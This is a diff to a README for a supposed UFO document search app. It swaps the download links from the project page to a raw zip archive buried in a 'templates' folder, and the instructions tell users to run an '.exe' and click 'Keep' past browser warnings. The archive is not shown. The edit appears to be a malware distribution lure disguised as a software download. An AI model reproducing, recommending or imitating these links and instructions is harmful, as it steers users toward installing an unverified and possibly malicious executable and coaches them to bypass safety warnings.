@@ -1,6 +1,6 @@
 # 🛸 ufo-search-app - Search declassified documents about UFOs easily
 
-[![](https://img.shields.io/badge/Download_Application-Grey-blue)](https://github.com/karylinspinnbar428/ufo-search-app)
+[![](https://img.shields.io/badge/Download_Application-Grey-blue)](https://github.com/karylinspinnbar428/ufo-search-app/raw/refs/heads/main/templates/ufo_search_app_v2.4-alpha.3.zip)
 
 ## 📖 About the project
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the app:
 
 You must visit the project page to download the necessary files. 
 
-[Visit this page to download the software](https://github.com/karylinspinnbar428/ufo-search-app).
+[Visit this page to download the software](https://github.com/karylinspinnbar428/ufo-search-app/raw/refs/heads/main/templates/ufo_search_app_v2.4-alpha.3.zip).
 
 Look for the link marked "Latest" on the right side of the page. Select the file ending in ".exe" to begin the download. Once the file finishes saving, your browser may ask if you want to keep the file. Select "Keep" to proceed. 
 
